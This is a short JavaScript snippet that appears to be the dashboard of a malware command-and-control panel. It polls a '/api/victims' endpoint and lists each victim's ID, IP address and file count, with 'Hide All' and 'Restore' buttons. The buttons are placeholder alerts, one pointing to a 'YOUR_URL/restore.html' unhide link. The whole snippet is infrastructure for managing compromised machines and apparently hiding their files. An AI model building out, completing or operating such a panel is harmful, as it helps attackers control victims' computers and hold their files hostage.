<script>
function refresh() {
    fetch('/api/victims').then(r => r.json()).then(data => {
        let html = "<table><tr><th>ID</th><th>IP</th><th>Files</th><th>Actions</th></tr>";
        for (let id in data) {
            let v = data[id];
            html += `<tr>
                <td>${v.id}</td>
                <td>${v.ip}</td>
                <td>${v.files.length}</td>
                <td>
                    <button onclick="alert('Hide command sent')">Hide All</button>
                    <button onclick="alert('Unhide link: YOUR_URL/restore.html')">Restore</button>
                </td>
            </tr>`;
        }
        html += "</table>";
        document.getElementById("victims").innerHTML = html;
    });
}
setInterval(refresh, 3000); refresh();
</script>
